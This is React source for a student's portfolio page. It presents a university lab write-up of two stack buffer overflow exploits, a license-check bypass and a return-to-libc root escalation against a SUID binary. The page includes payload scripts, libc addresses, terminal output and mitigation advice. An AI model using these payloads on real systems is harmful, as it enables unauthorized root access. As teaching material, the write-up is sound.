/* global React, ReactDOM, StackDiagram, Terminal, PayloadStrip, CodePanel, Chip, KV */
/* global TweaksPanel, TweakSection, TweakRadio, TweakSlider, useTweaks */

const { useState: useS, useEffect: useE, useMemo: useM } = React;

const TWEAK_DEFAULTS = /*EDITMODE-BEGIN*/{
  "theme": "dark",
  "animSpeed": 1,
  "autoPlay": true
}/*EDITMODE-END*/;

/* ============ HERO ============ */
function Hero() {
  // animated overflow on "Overflow"
  return (
    <header className="hero">
      <div>
        <div style={{display:'flex', gap:12, alignItems:'center', marginBottom:24, fontFamily:'var(--mono)', fontSize:11, color:'var(--muted)', letterSpacing:'0.12em', textTransform:'uppercase'}}>
          <span style={{color:'var(--accent)'}}>CIS*6540</span>
          <span>·</span>
          <span>Adv. Penetration Testing &amp; Exploit Development</span>
          <span>·</span>
          <span>University of Guelph</span>
        </div>

        <h1>
          Buffer{' '}
          <span className="gl">Over<OverflowingWord />ow.</span>
        </h1>

        <p className="lede">
          Two hands-on stack-based exploits against deliberately-vulnerable
          Linux binaries — a variable-corruption license bypass, and a
          return-to-libc privilege escalation against a SUID root binary.
          Documented step-by-step, with live byte-level walkthroughs.
        </p>

        <div className="meta-grid">
          <span className="dim">author</span>      <b>Sumesh Kumar</b>
          <span className="dim">date</span>        <b>May 2026</b>
          <span className="dim">environment</span> <b>Ubuntu 14.04 LTS · i686</b>
          <span className="dim">protections</span> <b style={{color:'var(--danger)'}}>ASLR off · NX off · canary off</b>
          <span className="dim">scope</span>       <b>2 exploits · 10 marks total</b>
        </div>
      </div>

      <HeroVis />
    </header>
  );
}

function OverflowingWord() {
  // 'fl' letters get pushed off the page slightly as 'A's spill
  const [overflowed, setOverflowed] = useS(false);
  useE(() => {
    const t = setTimeout(() => setOverflowed(true), 600);
    return () => clearTimeout(t);
  }, []);
  return (
    <span style={{position:'relative', display:'inline-block'}}>
      fl
      <span style={{
        position:'absolute',
        left: '100%',
        top: 0,
        whiteSpace:'nowrap',
        color: 'var(--danger)',
        fontFamily: 'var(--mono)',
        fontSize: '0.35em',
        letterSpacing: '-0.02em',
        opacity: overflowed ? 1 : 0,
        transform: `translateX(${overflowed ? '4px' : '-12px'})`,
        transition: 'all 0.8s cubic-bezier(0.2, 0.9, 0.3, 1.1)',
        verticalAlign: 'top',
        marginTop: '0.6em',
      }}>
        AAAAAAAAAAAAAAA…
      </span>
    </span>
  );
}

function HeroVis() {
  // a small static stack pic with bytes spilling out of buffer into return addr
  return (
    <div className="hero-vis">
      <div className="label">
        <span>stack memory · low → high</span>
        <span style={{color:'var(--danger)'}}>● SEGV</span>
      </div>

      <div style={{display:'flex', flexDirection:'column', gap:6}}>
        <HeroStackRow name="char buf[16]" cells={['A','A','A','A','A','A','A','A','A','A','A','A','A','A','A','A']} kind="payload" addr="0xbffff520"/>
        <HeroStackRow name="saved EBP" cells={['A','A','A','A']} kind="corrupt" addr="0xbffff530"/>
        <HeroStackRow name="return addr" cells={['10','33','e5','b7']} kind="target" addr="0xbffff534" hex/>
        <HeroStackRow name="fake ret" cells={['41','41','41','41']} kind="fakeret" addr="0xbffff538" hex/>
        <HeroStackRow name="char* arg" cells={['4c','5d','f7','b7']} kind="shell" addr="0xbffff53c" hex/>
      </div>

      <div style={{marginTop:18, display:'flex', justifyContent:'space-between', alignItems:'flex-end'}}>
        <div style={{fontSize:10, color:'var(--muted)', lineHeight:1.5}}>
          <div>system()  → <span style={{color:'var(--accent)'}}>0xb7e53310</span></div>
          <div>"/bin/sh" → <span style={{color:'var(--violet)'}}>0xb7f75d4c</span></div>
        </div>
        <div style={{fontSize:32, fontFamily:'var(--mono)', color:'var(--accent)', letterSpacing:'-0.05em'}}>
          uid=<span style={{color:'var(--danger)'}}>0</span>
        </div>
      </div>
    </div>
  );
}

function HeroStackRow({ name, cells, kind, addr, hex }) {
  return (
    <div style={{display:'flex', alignItems:'center', gap:8}}>
      <span style={{width:78, fontSize:10, color:'var(--muted)'}}>{addr}</span>
      <span style={{width:90, fontSize:11, color:'var(--text-dim)'}}>{name}</span>
      <div style={{display:'flex', gap:2}}>
        {cells.map((c, i) => (
          <div key={i} className={`byte ${kind}`} style={{
            width: hex ? 20 : 14, height: 18,
            fontSize: hex ? 9 : 8,
          }}>
            {c}
          </div>
        ))}
      </div>
    </div>
  );
}

/* ============ ENV CHIPS ============ */
function EnvStrip() {
  return (
    <div className="chips" style={{marginBottom: 80}}>
      <Chip label="OS"          value="Ubuntu 14.04 LTS · 32-bit"/>
      <Chip label="Arch"        value="i686 (Intel)"/>
      <Chip label="CFLAGS"      value="-fno-stack-protector -z execstack"/>
      <Chip label="ASLR"        value="0  (disabled)"/>
      <Chip label="Stack canary" value="absent"/>
      <Chip label="NX bit"       value="off"/>
    </div>
  );
}

/* ============ TASK 1 ============ */
function Task1({ speed, autoPlay }) {
  const layout = [
    { name: 'usr_key[]',   bytes: 32, addr: '0xbffff4f0', role: 'buffer', note: 'BUF_LEN' },
    { name: 'char  rv',    bytes: 1,  addr: '0xbffff510', role: 'target', note: 'return flag' },
    { name: 'char  i',     bytes: 1,  addr: '0xbffff511', role: 'other'  },
    { name: 'saved_key[]', bytes: 32, addr: '0xbffff512', role: 'other',  note: 'real key' },
    { name: 'int   cmp',   bytes: 4,  addr: '0xbffff532', role: 'other'  },
  ];
  const payload = [
    { count: 32, role: 'payload', value: 'A', glyph: 'A' },
    { count: 1,  role: 'corrupt', value: '01', glyph: '01' },
  ];

  return (
    <section className="section">
      <div className="section-head">
        <span className="num">TASK · 01</span>
        <h2>Product Registration Bypass</h2>
        <span className="marks">3 / 10 marks · variable-corruption</span>
      </div>

      <div className="task-grid">
        <CodePanel
          title="product_register.c · vulnerable path"
          tag="C"
          lines={[
            { n: 1,  html: '<span class="kw">int</span> <span class="fn">validate</span>(<span class="kw">char</span>* key) {' },
            { n: 2,  html: '  <span class="kw">char</span> usr_key[<span class="num">BUF_LEN</span>];   <span class="cm">// 32-byte buffer</span>' },
            { n: 3,  html: '  <span class="kw">char</span> rv  = <span class="num">0</span>;          <span class="cm">// return flag (1B)</span>' },
            { n: 4,  html: '  <span class="kw">char</span> i   = <span class="num">0</span>;' },
            { n: 5,  html: '  <span class="kw">char</span> saved_key[<span class="num">BUF_LEN</span>];' },
            { n: 6,  html: '  <span class="kw">int</span>  cmp = <span class="num">0</span>;' },
            { n: 7,  html: '' },
            { n: 8,  html: '  <span class="cm">// fetches real key into saved_key…</span>' },
            { n: 9,  html: '' },
            { n: 10, html: '  <span class="danger fn">strcpy</span>(usr_key, key);  <span class="danger cm">// ← unbounded copy</span>', hl: true },
            { n: 11, html: '  cmp = <span class="fn">strcmp</span>(usr_key, saved_key);' },
            { n: 12, html: '  <span class="kw">if</span> (cmp == <span class="num">0</span>) rv = <span class="num">1</span>;' },
            { n: 13, html: '  <span class="kw">return</span> rv;' },
            { n: 14, html: '}' },
          ]}
        />

        <div className="panel">
          <div className="panel-head">
            <div className="title mono"><span className="tag">RECIPE · </span>step-by-step</div>
          </div>
          <div className="panel-body">
            <ol className="steps">
              <li><b>Locate the 33rd byte.</b> The first 32 bytes fill <code>usr_key[]</code> exactly. The byte immediately after it is <code>rv</code>.</li>
              <li><b>Craft padding.</b> 32 dummy <code>'A'</code> bytes carry us across the buffer with no side-effects.</li>
              <li><b>Land on rv.</b> Tack on a single <code>\x01</code> — that becomes the 33rd byte and overwrites <code>rv</code> in-place.</li>
              <li><b>Let strcmp fail.</b> <code>cmp</code> ends up non-zero so the <code>if</code> on line 12 is skipped — but it doesn't matter.</li>
              <li><b>Return.</b> The function returns the (now corrupted) <code>rv</code> value. Main reads <code>1</code> and prints "Product Key Accepted!!!"</li>
            </ol>
          </div>
        </div>
      </div>

      <div className="h-rule">stack memory · live walkthrough</div>
      <StackDiagram
        layout={layout}
        payload={payload}
        speed={speed}
        autoPlay={autoPlay}
        label="frame of validate()  ·  payload writes ↓"
      />

      <div className="h-rule">payload anatomy · 33 bytes total</div>
      <div className="panel">
        <div className="panel-head">
          <div className="title mono"><span className="tag">SH · </span>prod_register.sh</div>
        </div>
        <pre className="code" style={{padding:18, margin:0}}>
{`#!/bin/bash
# Sumesh Kumar
./product_register abc $(python -c 'print "A"*32 + `}<span style={{color:'var(--warn)'}}>{`"\\x01"`}</span>{`')`}
        </pre>
        <PayloadStrip blocks={[
          { name:'padding',       hex:'A × 32', bytes:32, color:'var(--byte-payload)', note:'fills usr_key[]' },
          { name:'rv overwrite',  hex:'0x01',   bytes:1,  color:'var(--byte-corrupt)', note:'targets char rv' },
        ]}/>
      </div>

      <div className="h-rule">terminal · live attack</div>
      <Terminal
        speed={speed}
        autoPlay={autoPlay}
        script={[
          { kind: 'cmd',    text: 'cat prod_register.sh' },
          { kind: 'out',    text: '#!/bin/bash' },
          { kind: 'out',    text: '# Sumesh Kumar' },
          { kind: 'out',    text: `./product_register abc $(python -c 'print "A"*32 + "\\x01"')` },
          { kind: 'blank' },
          { kind: 'cmd',    text: './prod_register.sh' },
          { kind: 'out',    text: 'Enter product key:  validating…' },
          { kind: 'out',    text: 'strcmp(usr_key, saved_key) = 1   (mismatch)' },
          { kind: 'out',    text: 'returning rv = ?' },
          { kind: 'blank' },
          { kind: 'accept', text: 'Product Key Accepted!!!' },
        ]}
      />
    </section>
  );
}

/* ============ TASK 2 ============ */
function Task2({ speed, autoPlay }) {
  const layout = [
    { name: 'extension[]',   bytes: 16, addr: '0xbffff4e0', role: 'buffer', note: 'verify_extension' },
    { name: 'saved frame',   bytes: 16, addr: '0xbffff4f0', role: 'other',  note: 'EBP + locals'   },
    { name: 'return addr',   bytes: 4,  addr: '0xbffff500', role: 'target', note: '→ system()'     },
    { name: 'fake return',   bytes: 4,  addr: '0xbffff504', role: 'other',  note: 'dummy 0x41…'    },
    { name: 'arg → "/bin/sh"', bytes: 4, addr: '0xbffff508', role: 'other', note: 'argument to system' },
  ];
  const payload = [
    { count: 32, role: 'payload', value: 'A', glyph: 'A' },
    { count: 1,  role: 'target',  value: '10', glyph: '10' },
    { count: 1,  role: 'target',  value: '33', glyph: '33' },
    { count: 1,  role: 'target',  value: 'e5', glyph: 'e5' },
    { count: 1,  role: 'target',  value: 'b7', glyph: 'b7' },
    { count: 4,  role: 'fakeret', value: '41', glyph: '41' },
    { count: 1,  role: 'shell',   value: '4c', glyph: '4c' },
    { count: 1,  role: 'shell',   value: '5d', glyph: '5d' },
    { count: 1,  role: 'shell',   value: 'f7', glyph: 'f7' },
    { count: 1,  role: 'shell',   value: 'b7', glyph: 'b7' },
  ];

  return (
    <section className="section">
      <div className="section-head">
        <span className="num">TASK · 02</span>
        <h2>Privilege Escalation via SUID Binary</h2>
        <span className="marks">7 / 10 marks · return-to-libc</span>
      </div>

      <div className="task-grid">
        <CodePanel
          title="is_valid_html.c · verify_extension()"
          tag="C"
          lines={[
            { n: 1, html: '<span class="kw">int</span> <span class="fn">verify_extension</span>(<span class="kw">char</span>* fname) {' },
            { n: 2, html: '  <span class="kw">char</span> extension[<span class="num">16</span>];     <span class="cm">// only 16 bytes</span>' },
            { n: 3, html: '  <span class="kw">char</span>* ptr_fname = fname;' },
            { n: 4, html: '  <span class="kw">while</span> (*ptr_fname++ != <span class="str">\'.\'</span>);  <span class="cm">// skip past dot</span>' },
            { n: 5, html: '' },
            { n: 6, html: '  <span class="danger fn">strcpy</span>(extension, ptr_fname);  <span class="danger cm">// ← overflow point</span>', hl: true },
            { n: 7, html: '' },
            { n: 8, html: '  <span class="kw">return</span> <span class="fn">strcmp</span>(<span class="str">"html"</span>, extension);' },
            { n: 9, html: '}' },
            { n:10, html: '' },
            { n:11, html: '<span class="cm">// binary has SUID root → system() inherits euid=0</span>' },
          ]}
        />

        <div className="panel">
          <div className="panel-head">
            <div className="title mono"><span className="tag">PLAN · </span>return-to-libc</div>
          </div>
          <div className="panel-body">
            <ol className="steps">
              <li><b>Smash the frame.</b> Overflow <code>extension[16]</code> through to the saved return address — needs 32 bytes of pad to clear the frame.</li>
              <li><b>Pivot to libc.</b> Overwrite the return slot with the address of <code>system()</code> at <code>0xb7e53310</code>.</li>
              <li><b>Fake the call site.</b> The next 4 bytes are popped as <code>system()</code>'s return address; we don't care where it goes, fill with <code>'AAAA'</code>.</li>
              <li><b>Supply the argument.</b> The 4 bytes after that become argv[0] for <code>system()</code> — point it at <code>"/bin/sh"</code> at <code>0xb7f75d4c</code>.</li>
              <li><b>SUID does the rest.</b> Binary runs as root, so <code>system("/bin/sh")</code> spawns a root shell. <code>uid=0</code>.</li>
            </ol>
          </div>
        </div>
      </div>

      <div className="h-rule">stack memory · live walkthrough</div>
      <StackDiagram
        layout={layout}
        payload={payload}
        speed={speed}
        autoPlay={autoPlay}
        label="frame of verify_extension()  ·  payload writes ↓  ·  little-endian"
      />

      <div className="h-rule">payload anatomy · 44 bytes total</div>
      <div className="panel">
        <div className="panel-head">
          <div className="title mono"><span className="tag">SH · </span>validate_html.sh</div>
        </div>
        <pre className="code" style={{padding:18, margin:0, fontSize:12}}>
{`#!/bin/bash
# Return-to-libc exploit for is_valid_html
./is_valid_html test.$(python -c "print 'A'*32 + `}<span style={{color:'var(--warn)'}}>{`'\\x10\\x33\\xe5\\xb7'`}</span>{` + 'AAAA' + `}<span style={{color:'var(--violet)'}}>{`'\\x4c\\x5d\\xf7\\xb7'`}</span>{`")`}
        </pre>
        <PayloadStrip blocks={[
          { name:'padding',     hex:'A × 32',         bytes:32, color:'var(--byte-payload)', note:'span ext[] + saved frame' },
          { name:'system() ptr', hex:'\\x10\\x33\\xe5\\xb7', bytes:4,  color:'var(--byte-target)',  note:'0xb7e53310 little-endian' },
          { name:'fake return', hex:'AAAA',           bytes:4,  color:'var(--muted)',        note:'unused — system never returns here' },
          { name:'"/bin/sh" ptr', hex:'\\x4c\\x5d\\xf7\\xb7', bytes:4, color:'var(--byte-shell)',  note:'0xb7f75d4c argv[0]' },
        ]}/>
      </div>

      <div className="h-rule">addresses · resolved from libc with gdb</div>
      <div className="panel">
        <KV rows={[
          { k:'system()',  v: '<span class="hl">0xb7e53310</span>   <span class="muted">→ encoded as</span>  \\x10\\x33\\xe5\\xb7' },
          { k:'"/bin/sh"', v: '<span class="hl">0xb7f75d4c</span>   <span class="muted">→ encoded as</span>  \\x4c\\x5d\\xf7\\xb7' },
          { k:'gadget',    v: '<span style="color:var(--text-dim)">none required — libc functions used directly</span>' },
          { k:'endianness',v: 'x86 little-endian · MSB stored last' },
        ]}/>
      </div>

      <div className="h-rule">terminal · live attack &amp; shell</div>
      <Terminal
        speed={speed}
        autoPlay={autoPlay}
        title="uogsec@ubuntu: ~/buffer_overflow  ·  SUID exploit"
        script={[
          { kind: 'cmd', text: 'ls -l is_valid_html' },
          { kind: 'out', text: '-rwsr-xr-x  1 root root  7320 May 21  2026 is_valid_html' },
          { kind: 'out', text: '            ↑ SUID bit set, owned by root' },
          { kind: 'blank' },
          { kind: 'cmd', text: 'cat validate_html.sh' },
          { kind: 'out', text: '#!/bin/bash' },
          { kind: 'out', text: '# Return-to-libc exploit for is_valid_html' },
          { kind: 'out', text: `./is_valid_html test.$(python -c "print 'A'*32 + '\\x10\\x33\\xe5\\xb7' + 'AAAA' + '\\x4c\\x5d\\xf7\\xb7'")` },
          { kind: 'blank' },
          { kind: 'cmd', text: './validate_html.sh' },
          { kind: 'err', text: './validate_html.sh: line 8:  3515 Segmentation fault (core dumped)' },
          { kind: 'out', text: '  ↳ system() returned into AAAA → SEGV — but the shell was already spawned.' },
          { kind: 'blank' },
          { kind: 'rootCmd', text: 'whoami' },
          { kind: 'accept', text: 'root' },
          { kind: 'rootCmd', text: 'id' },
          { kind: 'accept', text: 'uid=0(root) gid=0(root) groups=0(root)' },
          { kind: 'rootCmd', text: '# pwned ✓' },
        ]}
      />
    </section>
  );
}

/* ============ LEARNINGS / MITIGATIONS ============ */
function Learnings() {
  return (
    <section className="section">
      <div className="section-head">
        <span className="num">SECTION · 03</span>
        <h2>Takeaways &amp; Mitigations</h2>
        <span className="marks">what stops this from happening on a real box</span>
      </div>

      <div className="learnings">
        <div className="learning-card">
          <div className="ico">⌘</div>
          <h4>Compiler &amp; linker</h4>
          <ul>
            <li><span><b>-fstack-protector-all</b> · canary catches both overflows before <code>ret</code>.</span></li>
            <li><span><b>-z noexecstack</b> · NX bit kills shellcode-on-stack class.</span></li>
            <li><span><b>-fPIE -pie</b> · randomizes binary base so addresses aren't guessable.</span></li>
            <li><span><b>-D_FORTIFY_SOURCE=2</b> · sized variants of strcpy/sprintf catch many at compile time.</span></li>
          </ul>
        </div>

        <div className="learning-card">
          <div className="ico">⎚</div>
          <h4>Kernel &amp; runtime</h4>
          <ul>
            <li><span><b>kernel.randomize_va_space = 2</b> · re-enable full ASLR; libc address moves every exec.</span></li>
            <li><span><b>noexec</b> mount option · drop SUID from any binary that doesn't actually need it.</span></li>
            <li><span><b>seccomp / AppArmor</b> · sandbox a parser to ban <code>execve</code> entirely.</span></li>
            <li><span><b>CET / shadow stack</b> · hardware return-address validation on modern Intel/AMD.</span></li>
          </ul>
        </div>

        <div className="learning-card">
          <div className="ico">∎</div>
          <h4>Source code</h4>
          <ul>
            <li><span><b>strncpy / strlcpy</b> with explicit sizeof — never trust caller length.</span></li>
            <li><span>Reject untrusted input over <code>PATH_MAX</code>/<code>NAME_MAX</code> at the boundary, not deep inside.</span></li>
            <li><span>Drop privileges with <code>setuid(getuid())</code> as early as possible.</span></li>
            <li><span>Treat warnings as errors — <code>-Wall -Wextra -Werror</code>.</span></li>
          </ul>
        </div>
      </div>
    </section>
  );
}

/* ============ FOOTER ============ */
function Footer() {
  return (
    <footer className="footer">
      <div>
        <h3>Sumesh Kumar</h3>
        <div>M.Sc. Cybersecurity · University of Guelph</div>
        <div style={{marginTop:12, display:'flex', flexDirection:'column', gap:4}}>
          <a href="mailto:sumeshkumar1901@gmail.com">sumeshkumar1901@gmail.com</a>
          <a href="https://github.com/prashersumesh">github.com/prashersumesh</a>
          <a href="https://linkedin.com/in/sumeshkumar1901">linkedin.com/in/sumeshkumar1901</a>
        </div>
      </div>

      <div>
        <h3>References</h3>
        <div>Aleph One · Smashing The Stack For Fun And Profit (1996)</div>
        <div>Erickson · Hacking: The Art of Exploitation</div>
        <div>Koziol et al. · The Shellcoder's Handbook</div>
        <div>OWASP Buffer Overflow Guide</div>
      </div>

      <div className="disclaimer">
        <b>⚠ Educational only.</b> Exploits developed in a controlled lab
        environment for a graduate-level cybersecurity course. Do not
        use these techniques on systems you do not own or have
        explicit written authorization to test.
      </div>
    </footer>
  );
}

/* ============ APP ============ */
function App() {
  const [t, setTweak] = useTweaks(TWEAK_DEFAULTS);

  useE(() => {
    document.documentElement.dataset.theme =
      t.theme === 'amber' ? 'amber' : t.theme === 'paper' ? 'paper' : '';
  }, [t.theme]);

  return (
    <div className="page">
      <div className="topbar">
        <div className="left">
          <span className="pill"><span className="dot"></span> LAB-SESSION · ACTIVE</span>
          <span>~/buffer_overflow</span>
        </div>
        <div style={{display:'flex', gap:16}}>
          <span>21 may 2026</span>
          <span style={{color:'var(--accent)'}}>uogsec@ubuntu</span>
        </div>
      </div>

      <Hero/>
      <EnvStrip/>
      <Task1 speed={t.animSpeed} autoPlay={t.autoPlay}/>
      <Task2 speed={t.animSpeed} autoPlay={t.autoPlay}/>
      <Learnings/>
      <Footer/>

      <TweaksPanel title="Tweaks">
        <TweakSection label="Theme">
          <TweakRadio label="Palette" value={t.theme} options={[
            { value: 'dark',  label: 'Mint' },
            { value: 'amber', label: 'Amber' },
            { value: 'paper', label: 'Paper' },
          ]} onChange={(v) => setTweak('theme', v)}/>
        </TweakSection>
        <TweakSection label="Animations">
          <TweakSlider label="Playback speed" value={t.animSpeed} min={0.25} max={4} step={0.25} unit="×"
            onChange={(v) => setTweak('animSpeed', v)}/>
          <TweakRadio label="Autoplay" value={t.autoPlay} options={[
            { value: true,  label: 'on' },
            { value: false, label: 'off' },
          ]} onChange={(v) => setTweak('autoPlay', v)}/>
        </TweakSection>
      </TweaksPanel>
    </div>
  );
}

const root = ReactDOM.createRoot(document.getElementById('root'));
root.render(<App/>);
